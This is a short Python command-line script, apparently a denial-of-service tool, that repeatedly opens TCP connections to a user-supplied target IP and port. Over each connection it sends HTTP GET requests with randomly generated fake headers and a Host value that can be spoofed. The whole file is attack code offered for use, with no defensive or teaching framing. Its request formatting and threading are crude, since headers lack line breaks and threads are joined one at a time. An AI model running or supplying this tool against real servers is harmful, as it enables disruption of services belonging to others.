import threading
import socket
import argparse
from fake_headers import Headers

class Dos:
    def __init__(self, targetIp, targetPort, fakeIp):
        self.targetIp, self.targetPort = targetIp, targetPort
        self.fakeIp = fakeIp
    
    def send(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((self.targetIp, self.targetPort))

        miscHeader, hDict = 'GET /' + ' HTTP/1.1 HOST: ' + self.fakeIp + ' ', Headers(headers=True).generate()
        for _ in hDict:
            miscHeader += _
            miscHeader += ' '
            miscHeader += hDict[_]
            miscHeader += ' '

        self.s.sendto(miscHeader.encode('utf-8'), (self.targetIp, self.targetPort))

    def attack(self, repeat:int=1):
        for _ in range(1, repeat+1):
            t = threading.Thread(target=self.send)

            t.daemon = True
            t.start()
            t.join()

        self.s.close()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()

    parser.add_argument('-ip', dest='ip', type=str, required=True, help='the ip of the target server')
    parser.add_argument('-port', dest='port', type=int, required=True, help='the port of the target server')
    
    parser.add_argument('-fakeip', dest='fakeIp', type=str, required=False, help='appear as the provided ip on the server\'s header requests')

    parser.add_argument('-r', dest='recursive', type=int, required=True, help='number of times the function will run')
    args = parser.parse_args()

    if args.fakeIp is None:
        args.fakeIp = '127.0.0.1' 

    dosCode = Dos(args.ip, args.port, args.fakeIp)
    dosCode.attack(args.recursive)